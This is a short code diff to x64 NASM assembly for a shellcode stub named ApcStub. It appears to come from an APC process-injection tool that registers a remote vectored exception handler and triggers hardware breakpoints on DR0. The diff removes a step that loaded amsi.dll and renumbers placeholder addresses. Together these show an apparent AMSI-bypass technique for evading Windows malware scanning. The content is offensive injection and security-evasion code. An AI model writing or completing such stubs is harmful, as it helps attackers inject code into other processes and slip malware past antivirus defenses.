@@ -1,19 +1,15 @@
 [BITS 64]
 
+; nasm -f bin apc.asm -o apc.bin ; xxd -i apc.bin
 ApcStub:
     push rbp
     mov rbp, rsp
     sub rsp, 28h                ; 32 bytes shadow space + 8 bytes alignment
 
-    ; 1. LoadLibraryA("amsi.dll")
-    lea rcx, [rel AmsiStr]
-    mov rax, 0xBBBBBBBBBBBBBBBB ; Placeholder for pLoadLibraryA
-    call rax
-
     ; 2. RtlAddVectoredExceptionHandler(1, pVehHandler)
     mov rcx, 1                  ; CALL_FIRST
-    mov rdx, 0xCCCCCCCCCCCCCCCC ; Placeholder for pRemoteVeh
-    mov rax, 0xDDDDDDDDDDDDDDDD ; Placeholder for pRtlAddVeh
+    mov rdx, 0xDDDDDDDDDDDDDDDD ; Placeholder for pRemoteVeh
+    mov rax, 0xEEEEEEEEEEEEEEEE ; Placeholder for pRtlAddVeh
     call rax
 
     ; 3. Trigger VEH to apply HWBP on DR0
